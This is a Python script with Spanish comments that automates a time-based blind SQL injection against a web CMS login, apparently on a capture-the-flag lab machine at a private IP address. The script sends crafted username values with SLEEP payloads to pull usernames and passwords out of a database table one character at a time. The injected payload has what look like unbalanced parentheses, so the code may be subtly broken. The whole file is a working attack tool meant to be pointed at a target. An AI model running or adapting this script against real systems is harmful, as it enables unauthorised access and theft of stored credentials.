#!/usr/bin/python3

# Script para extraer las columnas de una tabla de una base de datos específica.

from pwn import *
import requests, signal, sys, time, string


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#---------------------------------------------#

# Variables Globales
main_url = "http://192.168.0.76/imfadministrator/cms.php?pagename="    #  Cambiar
characters = string.ascii_lowercase + ":,-_." + string.digits

#---------------------------------------------#


def sqli_timebased():
          
     data = ""

     p1 = log.progress("SQLI Time-based")
     p1.status("Iniciando ataque de inyección SQL")

     time.sleep(2)

     p2 = log.progress("Data")


     headers = {
        'Content-Type': 'application/x-www-form-urlencoded'     #  Importante esta cabecera porque sino, no te interpreta correctamente
     }


     for position in range(1, 100):         
         for character in characters:

             post_data = {
                     'op': 'adminlogin',
                     'username': "admin' AND IF(substr((select group_concat(username,0x3a,password) from pages)),%d,1)='%s',SLEEP(0.85),1)-- -" % (position, character),
                     'password': 'admin'
             }
            
             
             p1.status(post_data['username']) 

             time_start = time.time() 
             r = requests.post(main_url, data=post_data, headers=headers)
             time_end = time.time()


             if time_end - time_start > 0.85:
                 data += character
                 p2.status(data)
                 break


     p1.success("Ataque de inyección SQL completado")
     p2.success(data)

#---------------------------------------------#

if __name__ == '__main__':
    sqli_timebased()
